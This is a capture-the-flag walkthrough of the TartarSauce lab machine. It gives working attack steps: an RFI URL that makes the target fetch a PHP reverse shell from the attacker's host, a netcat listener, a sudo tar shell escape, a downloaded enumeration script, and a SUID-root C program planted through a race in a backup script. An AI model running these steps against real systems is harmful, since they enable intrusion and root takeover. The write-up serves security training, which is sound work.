# TartarSauce Writeup w/o Metasploit

![](https://miro.medium.com/max/579/1*qubhjtqsdtBNKNNS4NdBEQ.png)

## Reconnaissance <a id="335d"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.88 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.88
                                                                                                                                      
Host is likely running Linux---------------------Starting Nmap Quick Scan---------------------
                                                                                                                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 00:02 EST
Nmap scan report for 10.10.10.88
Host is up (0.038s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 0.78 seconds---------------------Starting Nmap Basic Scan---------------------
                                                                                                                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 00:02 EST
Nmap scan report for 10.10.10.88
Host is up (0.031s latency).PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing PageService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                                                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 00:02 EST
Warning: 10.10.10.88 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.88
Host is up (0.031s latency).
All 1000 scanned ports on 10.10.10.88 are open|filtered (958) or closed (42)Nmap done: 1 IP address (1 host up) scanned in 36.95 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 00:02 EST
Initiating Parallel DNS resolution of 1 host. at 00:02
Completed Parallel DNS resolution of 1 host. at 00:02, 0.01s elapsed
Initiating SYN Stealth Scan at 00:02
Scanning 10.10.10.88 [65535 ports]
Discovered open port 80/tcp on 10.10.10.88
SYN Stealth Scan Timing: About 23.01% done; ETC: 00:05 (0:01:44 remaining)
SYN Stealth Scan Timing: About 45.91% done; ETC: 00:05 (0:01:12 remaining)
SYN Stealth Scan Timing: About 68.80% done; ETC: 00:05 (0:00:41 remaining)
Completed SYN Stealth Scan at 00:05, 131.36s elapsed (65535 total ports)
Nmap scan report for 10.10.10.88
Host is up (0.034s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  httpRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 131.50 seconds
           Raw packets sent: 65666 (2.889MB) | Rcvd: 65542 (2.622MB)No new ports---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                      
Running CVE scan on basic ports
                                                                                                                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 00:05 EST
Nmap scan report for 10.10.10.88
Host is up (0.030s latency).PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
....Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 secondsRunning Vuln scan on basic ports
                                                                                                                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 00:05 EST
Nmap scan report for 10.10.10.88
Host is up (0.029s latency).PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
....Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 328.12 seconds---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                                                                      
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.88:80 -o recon/gobuster_10.10.10.88_80.txt
nikto -host 10.10.10.88:80 | tee recon/nikto_10.10.10.88_80.txtWhich commands would you like to run?                                                                                                 
All (Default), gobuster, nikto, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                                                                      
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.88:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/15 00:11:12 Starting gobuster
===============================================================
http://10.10.10.88:80/index.html (Status: 200) [Size: 10766]
http://10.10.10.88:80/webservices (Status: 301) [Size: 316]
http://10.10.10.88:80/server-status (Status: 403) [Size: 299]
===============================================================
2020/01/15 00:43:49 Finished
===============================================================Finished gobuster scan
                                                                                                                                      
=========================
                                                                                                                                      
Starting nikto scan
                                                                                                                                      
- Nikto v2.1.6
--------------------------------------------------------------------
+ Target IP:          10.10.10.88
+ Target Hostname:    10.10.10.88
+ Target Port:        80
+ Start Time:         2020-01-15 00:43:50 (GMT-5)
--------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Cookie PHPSESSID created without the httponly flag
+ Entry '/webservices/monstra-3.0.4/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 5 entries which should be manually viewed.
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2a0e, size: 565becf5ff08d, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7883 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2020-01-15 00:49:53 (GMT-5) (363 seconds)
--------------------------------------------------------------------
+ 1 host(s) testedFinished nikto scan
                                                                                                                                      
=========================
                                                                                                                                      
                                                                                                                                      
                                                                                                                                      
---------------------Finished all Nmap scans---------------------Completed in 47 minute(s) and 46 second(s)
```

Before we move on to enumeration, let’s make some mental notes about the scan results. We have only one port open.

* **Port 80:** running Apache httpd 2.4.18

The nmap/nikto/gobuster scans found the following directories/files: _http-robots.txt_, _index.html_ and _/webservices_.

## Enumeration <a id="bffd"></a>

Visit the web application.

![](https://miro.medium.com/max/1055/1*MBY6ajJPnAguFplMNE0lGA.png)

There’s nothing useful on the _index.html_ page. Let’s view the _robots.txt_ page.

```text
User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
```

It gives us a list of URLs that web robots are instructed not to visit. Only one of these links are valid.

![](https://miro.medium.com/max/1288/1*GDLOpYl9UvpWXQ0OzX3zbw.png)

The application is using a Content Management System \(CMS\) called Monstra and the version is available at the footer of the site \(3.0.4\). Let’s see if it has any known exploits.

![](https://miro.medium.com/max/1369/1*TOGQ4ihEi7pGCeG4zuZ5wA.png)

The version being used is vulnerable to an authenticated RCE exploit. So we first need to find credentials.

Click on the “logged in” link and try the default credentials _admin/admin_.

![](https://miro.medium.com/max/1331/1*05guS59Sx_wJgMLPqsZqGQ.png)

It worked! Copy the RCE exploit into the current directory.

```text
searchsploit -m 43348
```

View the exploit.

![](https://miro.medium.com/max/1214/1*lCp9KBo5WQVwXCcfLUekrQ.png)

It seems like there’s insufficient input validation on the upload files functionality that allows a malicious attacker to upload a PHP script. Let’s try doing that.

I tried a bunch of valid extensions, however, I kept getting a “_File was not uploaded error_”. The upload functionality does not seem to be working at all. So this is a dead end.

We need to enumerate more. Run gobuster on the _webservices_ directory.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 30 -e -u http://10.10.10.88:80/webservices -o 10.10.10.88/recon/extra_gobuster_10.10.10.88_80.txt
```

* **dir:** directory mode
* **-w:** wordlist
* **-l:** include the length of the body in the output
* **-t:** thread count
* **-e:** expanded mode, print full URLs
* **-u:** URL
* **-o:** output file

We get the following output.

```text
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.88:80/webservices
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/15 18:33:24 Starting gobuster
===============================================================
http://10.10.10.88:80/webservices/wp (Status: 301) [Size: 319]
===============================================================
2020/01/15 18:44:11 Finished
```

Visit the link.

![](https://miro.medium.com/max/640/1*GgIJ25gtToOuAumnMZq3Pw.png)

This is a WordPress site, so let’s run wpscan on it to determine the version used and enumerate any installed plugins.

```text
wpscan --url http://10.10.10.88:80/webservices/wp -e ap --plugins-detection aggressive --api-token [redacted]
```

* **— url:** the URL of the blog to scan
* **-e ap:** enumerate all plugins
* **— plugins-detection aggressive:** use the aggressive mode
* **— api-token:** personal token for using wpscan

We get the following result.

```text
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|WordPress Security Scanner by the WPScan Team
                         Version 3.7.5
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________[+] URL: http://10.10.10.88/webservices/wp/
[+] Started: Thu Jan 16 21:40:01 2020Interesting Finding(s):[+] http://10.10.10.88/webservices/wp/
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%[+] http://10.10.10.88/webservices/wp/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - ...[+] http://10.10.10.88/webservices/wp/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%[+] http://10.10.10.88/webservices/wp/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'WordPress 4.9.4'
 |
 | [!] 25 vulnerabilities identified:
 |
 ...[i] The main theme could not be detected.[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:12:07 <===========================================================================================> (84420 / 84420) 100.00% Time: 00:12:07
[+] Checking Plugin Versions (via Passive and Aggressive Methods)[i] Plugin(s) Identified:[+] akismet
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
 | Last Updated: 2019-11-13T20:46:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 |...[+] gwolle-gb
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2019-10-25T15:26:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 3.1.7
....[+] WPVulnDB API OK
 | Plan: free
 | Requests Done (during the scan): 4
 | Requests Remaining: 41[+] Finished: Thu Jan 16 21:52:23 2020
[+] Requests Done: 84464
[+] Cached Requests: 8
[+] Data Sent: 22.644 MB
[+] Data Received: 11.401 MB
[+] Memory used: 312.409 MB
[+] Elapsed time: 00:12:21
```

The WordPress version identified is 4.9.4. It has two plugins installed: akismet and gwolle-gb. Let’s check if the gwolle-gb plugin has any vulnerabilities.

![](https://miro.medium.com/max/1417/1*1Apge0-7m0mtVjHzQtfWAg.png)

It is vulnerable to a remote file inclusion \(RFI\). Copy the exploit to the current directory.

```text
searchsploit -m 38861
```

View the exploit.

![](https://miro.medium.com/max/1425/1*mfOZy0urJYekQDYK-XjYQw.png)

The “_abspath_” input parameter being used in the PHP require\(\) function is not properly validated and therefore, a malicious attacker can upload and run a malicious PHP script withe filename _wp-load.php_.

## Initial Foothold <a id="94df"></a>

Get a PHP reverse shell from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and rename it to _wp-load.php_. Start up a simple server where the shell is located.

```text
python -m SimpleHTTPServer 5555
```

Set up a netcat listener on the attack machine to receive the reverse shell.

```text
nc -nlvp 1234
```

Visit the following link with the correct URL to the simple server.

```text
http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.12:5555/
```

We get a shell!

![](https://miro.medium.com/max/433/1*Buu5WITctkJPvTeE68ltsA.png)

Let’s upgrade it to a better shell.

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```text
export TERM=xterm
```

Unfortunately, we’re running as the web daemon user _www-data_ and we don’t have privileges to view the _user.txt_ flag. Therefore, we need to escalate our privileges.

## Privilege Escalation <a id="455b"></a>

Run the following command to view the list of allowed commands the user can run using sudo without a password.

```text
www-data@TartarSauce:/$ sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

As can be seen above, we have the right to run the binary _/bin/tar_ with _onuma_’s privileges. Visit [gotfobins](https://gtfobins.github.io/gtfobins/tar/#sudo) website to see if we can spin up a shell using the tar command.

![](https://miro.medium.com/max/828/1*PNorEB7LVRHjI-uPEbfsqg.png)

Perfect! Run the following command to get a shell running with _onuma_’s privileges.

```text
sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Grab the _user.txt_ flag.

![](https://miro.medium.com/max/655/1*jUr2sHd5ryedFhHasAoI5w.png)

To view the _root.txt_ flag, we need to escalate our privileges to root.

Let’s transfer the _LinEnum_ script from our attack machine to the target machine.

In the attack machine, start up a server in the same directory that the script resides in.

```text
python -m SimpleHTTPServer 5555
```

In the target machine, change to the _/tmp_ directory where we have write privileges and download the _LinEnum_ script.

```text
cd /tmp
wget http://10.10.14.12:5555/LinEnum.sh
```

Give it execute privileges.

```text
chmod +x LinEnum.sh
```

Run the script.

```text
./LinEnum.sh
```

We get back the following result.

```text
[-] Systemd timers:
NEXT                         LEFT          LAST                         PASSED      UNIT                         ACTIVATES
Fri 2020-01-17 21:46:48 EST  59s left      Fri 2020-01-17 21:41:48 EST  4min 0s ago backuperer.timer             backuperer.service
Fri 2020-01-17 23:20:44 EST  1h 34min left Fri 2020-01-17 15:01:45 EST  6h ago      apt-daily.timer              apt-daily.service
Sat 2020-01-18 06:20:57 EST  8h left       Fri 2020-01-17 06:18:35 EST  15h ago     apt-daily-upgrade.timer      apt-daily-upgrade.service
Sat 2020-01-18 21:45:29 EST  23h left      Fri 2020-01-17 21:45:29 EST  20s ago     systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
```

I’ve never seen a service called _backuperer.service_ before, so this must be a custom service. Let’s see if it is being run as a scheduled task. Download _pspy32_ and view results.

```text
2020/01/18 14:22:48 CMD: UID=0    PID=14010  | /bin/bash /usr/sbin/backuperer
```

It is being run on a consistent basis. Locate the _backuperer_ file on the target system.

```text
onuma@TartarSauce:/tmp$ locate backuper
/etc/systemd/system/multi-user.target.wants/backuperer.timer
/lib/systemd/system/backuperer.service
/lib/systemd/system/backuperer.timer
/usr/sbin/backuperer
```

View the _backuperer.timer_ file.

```text
[Unit]
Description=Runs backuperer every 5 mins[Timer]
# Time to wait after booting before we run first time
OnBootSec=5min
# Time between running each consecutive time
OnUnitActiveSec=5min
Unit=backuperer.service[Install]
WantedBy=multi-user.target
```

The service is run every 5 minutes. Next, view _backuperer_ binary file.

```text
onuma@TartarSauce:/tmp$ cat /usr/sbin/backuperer                   
#!/bin/bash#-------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

Let’s breakdown what the script is doing. First, the following variables are being initialized in the script.

```text
basedir=/var/www/html #dir
bkpdir=/var/backups #dir
tmpdir=/var/tmp #dir
testmsg=/var/backups/onuma_backup_test.txt #file
errormsg=/var/backups/onuma_backup_error.txt #file
tmpfile=/var/tmp/.[random-sha1-value] #file
check=/var/tmp/check #dir
```

Then the script performs the following actions.

1. Recursively deletes the files/directories: _/var/tmp/.\*_ and _/var/tmp/check_.
2. Creates a gzip file of the directory _/var/www/html_ and saves it in the file _/var/tmp/.\[random-sha1-value\]_.
3. Sleeps for 30 seconds.
4. Creates the directory _/var/tmp/check._
5. Changes to the directory _/var/tmp/check_ and extract the gzip _/var/tmp/.\[random-sha1-value\]_.
6. If the files in _/var/www/html_ are different from the files in the backup it created _/var/tmp/check/var/www/html_, then report error. Otherwise, move file _/var/tmp/.\[random-sha1-value\]_ to _/var/backups/onuma-wwww-dev.bak_ and remove everything in the _check_ directory and any files that start with the character “_._”. Those would be the backup _.\[random-sha1-value\]_ files it created.

The exploit for this is not very intuitive so bear with me as I try to explain it. When the backup is being created, the script sleeps 30 seconds before it executes the rest of the commands. We can use these 30 seconds to replace the backup tar file that the script created with our own malicious file.

After the 30 seconds pass, it will create a directory called “_check_” and decompress our malicious backup tar file there. Then it will go through the integrity check and fail, thereby giving us 5 minutes before the next scheduled task is run, to escalate privileges. Once the 5 minutes are up, the _backuperer_ program is run again and our files get deleted.

The way we’re going to escalate privileges is by creating our own compressed file that contains an SUID executable.

Hopefully that makes some sense. Let’s start our attack.

First, create the directory _var/www/html_ in our attack machine. Then place the following [_setuid.c_](https://medium.com/@falconspy/useful-oscp-notes-commands-d71b5eda7b02) program file in the directory.

```text
#include <unistd.h>int main()
{
    setuid(0);
    execl("/bin/bash", "bash", (char *)NULL);
    return 0;
}
```

Compile the program.

```text
gcc -m32 -o setuid setuid.c
```

* **-m32:** 32 bit architecture since the target machine is running a 32 bit os
* **-o:** output file

Then set the SUID bit on the compiled program.

```text
root@kali:~/Desktop/var/www/html# chmod u+s setuidroot@kali:~/Desktop/bla1/var/www/html# ls -la
total 24
drwxr-xr-x 2 root root  4096 Jan 18 11:24 .
drwxr-xr-x 3 root root  4096 Jan 18 10:09 ..
-rwsr-xr-x 1 root root 15532 Jan 18 11:24 setuid
```

Since we’re running as root in kali \(our attack machine\), the owner of the file is root and therefore the SUID bit allows a non-privileged user to execute the file with root privileges.

Now compress the entire _var_ directory and save it in the file _exploit_.

```text
tar -zcvf exploit var
```

Set up a python server on your attack machine.

```text
python -m SimpleHTTPServer 5555
```

On your target machine, download the compressed exploit file in the directory _/var/tmp_.

```text
http://10.10.14.12:5555/exploit
```

Now wait for the _backuperer_ scheduled service to run and create the backup file. We know this happens every 5 minutes. To view how much time is left before the scheduled service is going to run again, use the following command.

```text
systemctl list-timers
```

When the service is run, view the content of the directory.

```text
onuma@TartarSauce:/var/tmp$ ls -la
total 11280
drwxrwxrwt  8 root  root      4096 Jan 18 21:01 .
drwxr-xr-x 14 root  root      4096 Feb  9  2018 ..
-rw-r--r--  1 onuma onuma 11511681 Jan 18 21:01 .e84f032e69e2e221528b5c1c2ea7fa946a905584
-rw-r--r--  1 onuma onuma     2765 Jan 18 11:46 exploit
drwx------  3 root  root      4096 Feb 17  2018 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
drwx------  3 root  root      4096 Jan 18 20:41 systemd-private-6490911d22fe49afb4fe34c1971285c9-systemd-timesyncd.service-5H4XIC
....
```

The program generated backup compressed file is .e84f0\*\*\*\*. Replace it with our exploit file.

```text
cp exploit .e84f032e69e2e221528b5c1c2ea7fa946a905584
```

Now we just have to wait for 30 seconds \(sleep time\) before the .e84f0\*\*\*\* tar file \(which is really our exploit file\) is decompressed and saved in the directory check.

```text
onuma@TartarSauce:/var/tmp$ ls -la
total 44
drwxrwxrwt  9 root  root  4096 Jan 18 21:01 .
drwxr-xr-x 14 root  root  4096 Feb  9  2018 ..
-rw-r--r--  1 onuma onuma 2765 Jan 18 21:01 .e84f032e69e2e221528b5c1c2ea7fa946a905584
drwxr-xr-x  3 root  root  4096 Jan 18 21:01 check
-rw-r--r--  1 onuma onuma 2765 Jan 18 11:46 exploit
....
```

Enter the /_check/var/www/html_ directory.

```text
onuma@TartarSauce:/var/tmp$ cd check/var/www/html/
onuma@TartarSauce:/var/tmp/check/var/www/html$ ls -la
total 24
drwxr-xr-x 2 root root  4096 Jan 18 11:24 .
drwxr-xr-x 3 root root  4096 Jan 18 10:09 ..
-rwsr-xr-x 1 root root 15532 Jan 18 11:24 setuid
```

There we’ll see our setuid program with the SUID bit set! The reason the program still has the SUID bit set, is because when the compressed file was decompressed, it was decompressed with root privileges \(the privileges the program was running with\) and therefore, the permissions on the file were preserved.

Run the setuid program.

```text
onuma@TartarSauce:/var/tmp/check/var/www/html$ ./setuid
root@TartarSauce:/var/tmp/check/var/www/html# whoami
root
```

We are root! Grab the _root.txt_ flag.

![](https://miro.medium.com/max/806/1*9SSylldbmqFqkWgQ5yCwNQ.png)

## Lessons Learned <a id="d067"></a>

To gain an initial foothold on the box we exploited one vulnerability.

1. Use of known vulnerable components. The WordPress application was using an outdated plugin which was vulnerable to RFI. This allowed us to run a reverse shell back to our attack machine. The administrator should have updated the plugin to the most recent version.

To escalate privileges we exploited two vulnerabilities.

1. Sudo security misconfiguration of the tar binary. A non-privileged user was given the ability to run the tar binary with onuma user privileges. Since tar has the ability to run a shell, we were able to exploit it to get a shell with onuma user privileges. The administrator should have conformed to the principle of least privilege when setting permissions.
2. Security misconfiguration of scheduled service. A service that takes in user controlled files was running every 5 minutes. The service first compressed a backup file and then took that backup file back as input to the program. Since the file was created with user privileges, we were able to replace it with a malicious file that escalated our privileges to root. The administrator should have either restricted the permissions on the created backup file to root privileges or ran the service with user privileges.

